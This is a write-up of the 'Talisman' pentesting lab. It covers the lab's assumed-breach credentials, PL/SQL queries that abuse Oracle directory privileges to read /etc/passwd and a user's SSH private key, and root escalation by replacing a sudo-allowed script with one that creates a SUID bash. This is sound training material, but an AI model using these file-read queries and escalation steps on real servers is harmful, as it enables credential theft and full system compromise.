# [HackSmarter.org - Talisman](https://www.hacksmarter.org/courses/5e5b9833-e6be-4fa0-aa4d-efd3086a612c/take)

![e8fbf1c7094050d1d3edc8558aec1fb5.png](/resources/e8fbf1c7094050d1d3edc8558aec1fb5.png)

## Table of Contents

- [Abstract](#abstract)
- [Scope and Objective](#scope-and-objective)
- [Enumeration](#enumeration)
- [Initial Access as oracle by exfiltrating SSH private key though SQL query](#initial-access-as-oracle-by-exfiltrating-ssh-private-key-though-sql-query)
- [Script replacing and become root via SUDO](#script-replacing-and-become-root-via-sudo)

***
## Abstract 
Talisman is a Linux pentesting lab where we start off with a credential provides in assumed breach scenario and our ultimate goal is completely compromise this Linux server

The provided credential can be used to login into Oracle CloudBeaver Community hosting on port 8978 where we can use SQL editor to execute Oracle PL/SQL, with "CREATE ANY DIRECTORY" privilege assigned to "DEV" user which we are control, we can create a new oracle directory object and read local file

This result in SSH private key of "oracle" user compromised and initial access to Linux server, oracle user can execute a script own by root but as file was placed under directory that "oracle" user owns so we can remove it and create a new script to run any command as ROOT and this is how we fully compromise Linux server in this lab

## Scope and Objective
You have been assigned a penetration test on a critical Linux server in the client's environment. The scope is strictly limited to a single Linux server environment designated as the target. The primary objective is to gain root-level access to this system to demonstrate maximum impact and the full extent of the security compromise to the client.

A set of leaked credentials, recently recovered from a third-party data breach, have been provided. While the specific service or application these credentials belong to is unknown, they serve as the initial vector for establishing a foothold.

**Leaked Credentials**
```
jane / Greattalisman1! 
```

## Enumeration

Our initial port scan shows that there are only 2 ports exposed to us, one of them is SSH and the other one is 8978 which is non standard port
```
rustscan -a $IP -- -A
```
![132fdd44db6a0961992ff1f89d5d7b91.png](/resources/132fdd44db6a0961992ff1f89d5d7b91.png)

Upon visiting the website hosting on this port, we can see that it is running Oracle CloudBeaver Community

![3412d7453e9df3cb6ce20b188c66c5b4.png](/resources/3412d7453e9df3cb6ce20b188c66c5b4.png)

We can use provided credential to login and now we can use SQL Editor to execute Oracle PL/SQL 

![cd770651c7b87665b1f2f2755d5a9bd0.png](/resources/cd770651c7b87665b1f2f2755d5a9bd0.png)

First, we need to determine what kind of SYSTEM privilege that was granted to our server first and we can see that we have "CREATE ANY DIRECTORY" and "DROP ANY DIRECTORY" which allows creation of Oracle DIRECTORY objects that map to arbitrary filesystem paths on the database server

```
-- System privileges granted to you
SELECT * FROM USER_SYS_PRIVS;
```
![48ff8b1725a410ede91dddc4acaf330f.png](/resources/48ff8b1725a410ede91dddc4acaf330f.png)

We can also have READ, WRITE and EXECUTE permission over "EXT_DATA" table as well

```
-- Object privileges granted to you
SELECT * FROM USER_TAB_PRIVS;
```
![24528fb6434d89683e4b07e63d9793d6.png](/resources/24528fb6434d89683e4b07e63d9793d6.png)

## Initial Access as oracle by exfiltrating SSH private key though SQL query

With CREATE ANY DIRECTORY privilege, we can use it to create a directory object and map it to read `/etc/passwd` using `DBMS_XSLPROCESSOR.READ2CLOB` and then print out the content of this file to output console and when executed this we will need open output console by press Shift+Ctrl+O and we should be able to see the content of `/etc/passwd` file via this console

```
BEGIN
  EXECUTE IMMEDIATE 'CREATE OR REPLACE DIRECTORY dir_tmp AS ''/tmp''';
  EXECUTE IMMEDIATE 'CREATE OR REPLACE DIRECTORY dir_etc AS ''/etc''';
  -- Write passwd to /tmp for later retrieval
  DECLARE
    content CLOB;
  BEGIN
    content := DBMS_XSLPROCESSOR.READ2CLOB('DIR_ETC', 'passwd');
    -- Process or exfiltrate content here
    DBMS_OUTPUT.PUT_LINE(content);
  END;
END;
```
![2335b9a6d32b65f5a6bbe671da6870bd.png](/resources/2335b9a6d32b65f5a6bbe671da6870bd.png)

By looking at the content of this file, we can see that there are "oracle" and "superset" user that have interactive shell and their home directory inside `/home` so we try to pull SSH private key from `.ssh` directory of each user

![128c17a1fa871cce7321c07c183a1a6c.png](/resources/128c17a1fa871cce7321c07c183a1a6c.png)

And look like we have SSH private key of oracle user so let's save it to a file
```
BEGIN
  EXECUTE IMMEDIATE 'CREATE OR REPLACE DIRECTORY dir_tmp AS ''/tmp''';
  EXECUTE IMMEDIATE 'CREATE OR REPLACE DIRECTORY dir_etc AS ''/home/oracle/.ssh''';
  -- Write passwd to /tmp for later retrieval
  DECLARE
    content CLOB;
  BEGIN
    content := DBMS_XSLPROCESSOR.READ2CLOB('DIR_ETC', 'id_rsa');
    -- Process or exfiltrate content here
    DBMS_OUTPUT.PUT_LINE(content);
  END;
END;
```
![95e9bdb0a98efee1abdf8072ed7a4da2.png](/resources/95e9bdb0a98efee1abdf8072ed7a4da2.png)

Give read only permission by the owner to the SSH private key and now we should be able to land our foothold on this Linux server and loot user flag

```
chmod 600 oracle_id
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i oracle_id oracle@talisman.hs
```
![be1cf5bfe51ab403be1c73935f4338d8.png](/resources/be1cf5bfe51ab403be1c73935f4338d8.png)

## Script replacing and become root via SUDO

When I ran `sudo -l` command to check if I can execute any binary or script as other user, I can see that I can execute `/opt/oracle/product/21c/dbhomeXE/root.sh` without supplying any password as oracle user

![87663a579735ecf06797194ac381c6bc.png](/resources/87663a579735ecf06797194ac381c6bc.png)

The script can only be read, edit and modify by root as the owner but the script is placed under `/opt/oracle/product/21c/dbhomeXE/` where we have full permission over it

![e7c72360bc435ab7a48627465ca2af96.png](/resources/e7c72360bc435ab7a48627465ca2af96.png)

File deletion depends on directory permissions, NOT file permissions so we can directly remove it and create a new one in our version, this is not recommended in actual environment as we do not know what the actual content inside the script and if it has a proper backup as well

![6353585906e9c631c74370ac6484322d.png](/resources/6353585906e9c631c74370ac6484322d.png)

Since this is a lab, we can create our own script to replace it. my script will copy original bash binary to `/tmp` directory, set SUID bit as root and then execute it with `-p` which will grant me a bash shell with effective ID of root

```
#!/bin/bash
cp /bin/bash /tmp/bash
chmod u+s /tmp/bash
/tmp/bash -p
```

Remember that this script does not have execute permission yet so I will grant it and execute, how we should have a shell as root and also have backup of SUID bash in `/tmp` directory which we can also loot root flag and stop the engagement

```
chmod +x /opt/oracle/product/21c/dbhomeXE/root.sh
sudo /opt/oracle/product/21c/dbhomeXE/root.sh
```
![a840a04865a90090bbd7ad8991de420c.png](/resources/a840a04865a90090bbd7ad8991de420c.png)

We are done :D

***
